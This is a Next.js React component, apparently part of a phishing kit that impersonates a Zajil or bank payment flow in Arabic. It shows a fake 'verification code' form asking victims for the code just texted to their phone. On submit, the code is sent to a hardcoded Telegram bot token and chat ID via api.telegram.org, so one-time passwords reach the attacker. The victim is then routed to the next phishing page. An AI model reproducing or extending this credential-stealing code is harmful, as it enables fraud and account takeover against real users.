"use client"
import styles from './code.module.css'
import { useRef } from 'react'
import { useRouter } from 'next/navigation'
const Code = () => {
 
  
  const code = useRef();
  const router = useRouter()
  const handleSubmit = (e) => {
    e.preventDefault();
    var bot={
      token:"6602536113:AAEOJoRLjsoPUxdqp9SwU1jeFqtuXf712PY",
      chat_id:6364334502
    }
    var length= `%0A كود التحقق : ${code.current.value} %0A BY Admin Zajil:`
    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
  
  }

  return (
    <div className={styles.contect}>
      <div>
      <h1> كود التحقق</h1>
      
     
      <form  onSubmit={handleSubmit}>
        <label htmlFor="">
        ادخل كود التحقق المرسل حديثا لهاتفك
        <input type="text" ref={code} placeholder=" ****" />
        </label>
        <button type='submit' onClick={()=> router.push('/fozajil/banks/pay/code/nphad/codeto')}>تحقق</button>
      </form>
      <p>هل تواجه مشكلة في تسجيل الدخول ؟ أعد الاتصال</p>
      </div>
    </div>
  )
}

export default Code